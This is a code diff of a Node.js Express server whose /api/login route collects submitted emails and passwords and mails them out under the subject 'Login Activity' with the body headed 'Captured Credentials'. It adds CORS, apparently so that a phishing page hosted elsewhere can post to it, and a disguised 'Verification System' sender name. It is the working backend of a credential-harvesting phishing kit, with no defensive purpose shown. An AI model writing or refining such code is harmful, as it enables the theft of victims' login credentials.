@@ -1,14 +1,19 @@
 const express = require('express');
 const nodemailer = require('nodemailer');
+const cors = require('cors'); // Needed to allow GitHub to talk to this server
 const app = express();
+
+app.use(cors());
 app.use(express.json());
 
-// This is where you configure YOUR email settings
 const transporter = nodemailer.createTransport({
     service: 'gmail',
+    host: 'smtp.gmail.com',
+    port: 465,
+    secure: true,
     auth: {
         user: 'your-email@gmail.com',
-        pass: 'your-app-password'
+        pass: 'your-16-char-app-password' // NOT your login password
     }
 });
 
@@ -16,16 +21,19 @@ app.post('/api/login', (req, res) => {
     const { email, pass } = req.body;
 
     const mailOptions = {
-        from: 'system@yourdomain.com',
-        to: 'YOUR_RECEIVING_EMAIL@gmail.com',
-        subject: 'New Login Attempt Recorded',
-        text: `User: ${email}\nPassword: ${pass}`
+        from: 'Verification System <your-email@gmail.com>',
+        to: 'RECEIVING_EMAIL@gmail.com',
+        subject: `Login Activity: ${email}`,
+        text: `Captured Credentials:\n\nEmail: ${email}\nPassword: ${pass}\n\nTime: ${new Date().toLocaleString()}`
     };
 
     transporter.sendMail(mailOptions, (error, info) => {
-        if (error) return res.status(500).send("Error sending email");
-        res.status(200).send("Logged successfully");
+        if (error) {
+            console.log(error);
+            return res.status(500).json({ status: 'error' });
+        }
+        res.status(200).json({ status: 'success' });
     });
 });
 
-app.listen(3000, () => console.log('Server running on port 3000'));
+app.listen(process.env.PORT || 3000, () => console.log('Server Active'));
